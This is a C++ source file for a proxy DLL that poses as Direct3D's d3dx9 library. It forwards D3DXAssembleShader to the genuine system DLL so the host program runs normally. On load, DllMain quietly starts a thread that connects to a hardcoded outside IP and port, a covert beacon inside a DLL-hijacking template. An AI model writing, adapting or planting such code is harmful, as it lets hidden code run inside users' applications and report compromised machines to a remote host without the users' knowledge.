#define WIN32_LEAN_AND_MEAN  // Фикс конфликта макросов (Winsock и Windows.h)
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

// --- НАСТРОЙКА IP И ПОРТА ---
const char* target_ip = "185.71.65.56"; 
const int target_port = 7777;

typedef HRESULT(WINAPI* PFN_D3DXAssembleShader)(LPCSTR, UINT, const void*, void*, DWORD, void*, void*);
static PFN_D3DXAssembleShader pOriginalShader = nullptr;

extern "C" __declspec(dllexport) HRESULT WINAPI D3DXAssembleShader(
    LPCSTR pSrcData, UINT SrcDataLen, const void* pDefines, 
    void* pInclude, DWORD Flags, void* pShader, void* pErrorMsgs) 
{
    if (!pOriginalShader) {
        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        strcat_s(systemPath, "\\d3dx9_43.dll");
        HMODULE hOriginal = LoadLibraryA(systemPath);
        if (hOriginal) {
            pOriginalShader = (PFN_D3DXAssembleShader)GetProcAddress(hOriginal, "D3DXAssembleShader");
        }
    }
    
    if (pOriginalShader) {
        return pOriginalShader(pSrcData, SrcDataLen, pDefines, pInclude, Flags, pShader, pErrorMsgs);
    }
    return S_OK;
}

DWORD WINAPI NetworkThread(LPVOID lpParam) {
    Sleep(2000); 
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock != INVALID_SOCKET) {
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &serverAddr.sin_addr);

        connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));
        closesocket(sock);
    }
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, NetworkThread, NULL, 0, NULL);
    }
    return TRUE;
}
